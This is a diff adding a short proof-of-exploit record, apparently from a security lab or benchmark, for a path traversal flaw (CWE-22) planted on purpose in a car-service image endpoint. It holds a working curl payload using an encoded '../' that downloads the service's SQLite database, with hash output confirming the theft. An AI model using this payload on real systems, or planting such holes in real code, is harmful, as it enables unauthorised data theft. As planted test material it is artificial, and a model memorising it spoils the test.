@@ -1,0 +1,26 @@
+V2 - Path Traversal (CWE-22) on car-service GET /cars/{car_id}/images/{image_id}
+Date: 2026-10-18T16:59:18Z
+Commit: 697bcde + uncommitted changes planting V2 in car-service/app/main.py and auth-gateway/app/main.py
+Environment: docker compose, fresh seed (./scripts/seed.sh). alice is a seller (car 1).
+
+File locations inside the car-service container:
+  database:    /data/car.db
+  image store: /data/images/  (relative to this dir, ../car.db reaches the database)
+
+Exploit through the gateway. The gateway route is {image_id:path} and forwards the
+segment percent-encoded (..%2F), so curl --path-as-is sends the traversal unchanged.
+
+$ curl --path-as-is "http://localhost:8000/cars/1/images/..%2Fcar.db" -H "Authorization: Bearer <alice token>" -o stolen.db
+HTTP 200  bytes=32768  content-type=application/octet-stream
+
+Downloaded file (car-service's SQLite database, not an image):
+  size:      32768 bytes
+  sha256: 68aac0a5781e3cc1f44f85106f41f6f12274eea00db4e289810750057f0f2486
+  magic:  SQLite format 3
+
+In-container sha256 of the real database for comparison:
+  68aac0a5781e3cc1f44f85106f41f6f12274eea00db4e289810750057f0f2486
+
+The two hashes match: alice downloaded car-service's database file verbatim.
+Note: ../../car.db returns 502 because /data/images/../../car.db does not exist; the
+working payload is a single ../ (image store is one level below /data).
